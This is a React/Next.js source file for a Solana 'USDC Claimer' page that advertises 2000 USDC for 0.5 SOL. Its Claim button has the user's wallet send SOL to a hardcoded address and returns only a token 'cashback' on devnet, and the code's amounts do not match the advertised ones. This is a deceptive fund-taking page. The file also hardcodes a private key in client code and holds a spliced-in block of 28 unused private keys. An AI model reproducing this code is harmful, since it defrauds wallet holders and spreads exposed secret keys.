/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "pCvG8yqUzgJjffyDfLRLeKHazEogEWSM6hATvircYXCUjeaE8nuRdTpbChYhni82ytngQooV3saA3CCiErZhweb"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4BmUohJySCHyWBcn3yNHYBjP6Vie9kCe6TKGkYjYyK9M9dLTzbhVpofGtf7CyYu6SpN73sh2r19agH5JkNaDST3c",
  "key1": "51p8NqJu5CFt1KaJ7nyvYdxav6aVdXTRmwvYci8PeYAmqwbXgUqknfdWou8MTij8JiPgBUCz8yCycdeMofcYXiR4",
  "key2": "46yPhnaLgv5F2CPa1Qo4nj63PYrNxPF6GQpQKLmpFcnQRudrmHcuTUzRzTiaM79KexM5yK8QHtwhyLE8qqh9ZSrq",
  "key3": "5pVCC2EvCNjoQQCZdFVrJQeCRG4gdr3Hw7zVct4nTn6KN9VyF3uXagwG1khdaiW3pMQiHrMfXDmqifmqD39oMnUf",
  "key4": "31Lq9R83XCR5RHYVphurmN5tdoWtia9DRUAq2fWrPBSWiYxM2k4Ug5DP8KH1a4coorQFakVAuiNBBiAftXMEhcPK",
  "key5": "5L7S1AzjctuDPEjFMsi91vFAr7gjiiMWvdtoUvEEp3pqCGuguHA1qdWKiV2wKowgHJFdgLjQdGu61gJSWWsdYtqC",
  "key6": "1pucBsancHiaQvXySVAdKxqZ4RDAwjz1LZ8s2KqoqqgwUChf4jJi3krkNi553Hqk7Wkpp3cpQabTiekLkzVAoeu",
  "key7": "3GWCF4ymWjhExAuo4R55acJ58NbPWV9kJvxWUhfR1t3hE1rGTJpKjCCnHAKp8e4QxBEU1vGm911SHfwY1m1YGTCE",
  "key8": "2b22JGrkEqDRd2mAiREJCTEgKS1FM7JQP43vJTnVQiPutEDVoUBn2qhWws6r4rWjvXYEDF2ydHbw1JWzkMRp1iaq",
  "key9": "5Dz1D62Jj9gQDwBjJHrUYVAJ4UBEHt2RBifnbpJduSjfvk1zkTwrMKCir8R7GPZrdH1oDukuJzhWT54WogwtU7s5",
  "key10": "3P2PpcTeGWzCUM7cJaBX7zXa1D8WWyr8vEBnDoTvyJXEN5xcvDmJFTTWtnpBGHcxTj4TnpYus2koCG126gSqSUee",
  "key11": "2RCqQiUjQqQ51tedrJqJjTPhX2E55VAqCuCnokVYi8Hu5qgF9qaacyacKjLCZEswnh41U57tzM1jTQta815xc2Rn",
  "key12": "4GQNieTqTU28oeESsptTUnyMXjCRP5s5KQ3Z1YUay25DRvddLg6MH8gx5vn23nwhq9fpjjPumUVjsQyPpBqUqa5t",
  "key13": "5H8nrDBYWWGowAv3Px2dDNPAPUS2vsckNcrfJZvkoLe4mJehwy6qmeeqyeMU52k8RGSiJfjh2otMrx28iScqCAMe",
  "key14": "4Eqb6CxHyB2GE69vQM7b5wcUAocXvJA2fEKsj7gqkMDJAwVwZT4eZuJEWYN1FAKoATTEiypaFe6DZcXrioLymCD2",
  "key15": "dVfzjjqdhtfb3oRsLkpW7LxnGg5yFAqZisGAn2uh4jKtZMuF2vDqmPqZctm5c9wQ6sKFg7sfUkE2WVDuFrnUsX6",
  "key16": "4ixVC21Rcxk77vxMMThvDnM4pw535Aopkf4VNMGd6oJYPXHEBxX48QbtQEWT4Lg8Q3AzcjYb5V3BJHWRvsa3UNPT",
  "key17": "3kPTBkmyUsXY5UjdT5Zhqd66xVseA6Bp4wzykp2ZcEGDJbRZ6vf8NCD3zrf6sdWD3fVoEHzXJrAkLer7rF1yKPWh",
  "key18": "Mo4utuFt6MpDfKq7DYVNoA9r41oJk7TuFLQvshiHQmx9dRwrY6JBHzZcBv78JPdyGsL2uuVFi1b811XiAi3KTAk",
  "key19": "52iaHX8zYvsw6j99RkThZLrgkwzBCKacYwAJqmF8CQkJFEBanG5GHLn9PPd39YQ7ae1ZDaAAEYoycm73u4cD2cU4",
  "key20": "NQudQ4yNPBdb5zaLhNfecpFHvACdy9yU4W2aEiiNqgmLYQ5sZUqVUBUyRneFu3hU136XcKb6tzFmXkifDRWGsrd",
  "key21": "53uug3zXrVaALBikgWWuofRVXtAcfcvZkpYREGd6iJBJzWQMrkLoPEW1Vg2rTKUKLKkmpo2r2uz9gWr32RfFcv58",
  "key22": "5UouKZYVS5qeGriXpaJhbdmxgntEX4JDVt57sdEUiZLWCzcZH2fALCfksiY4zoqoTxUhQ42izTaMagmnWtqpaB21",
  "key23": "4KNnPJUyNnNyPuxGzpUtKLTe8iWpuLgHMMo2kEjy38QcJM7D9WYwTSJtWCuSRYWc2YPcoP4NMiabqqFjrER7jxo5",
  "key24": "EypU9rSMYSmUuMpMAkW6xrXy1fCw4mr5U6XPSvS639wvnuuivEi4nGf4xccGZXkw2oCa3ohJWAN6PbDQjhMhoYH",
  "key25": "iLBLiF58tNacJkJryrLxuquEhwhYgaMPn9FgqqDehd2Vz3wfmoD9qxMED87MhFp7m9jC6byrYUtPNFzAQJkB34R",
  "key26": "5dK7Q2BmAtVvPqGbrNeCt9HBESVY89C3evm2RxKECeamivfL1TAgduh7Y2RQDMeBdgbso9QqPreAH9tHjzznB4pg",
  "key27": "2oEbTL1uhYYNbgBXyWNniDt3byiTyprpEuCbhNFef2UPEwuLxzRZw2nARco6MUE1HHqkdmAEScswhAKWL4yjc3TQ"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
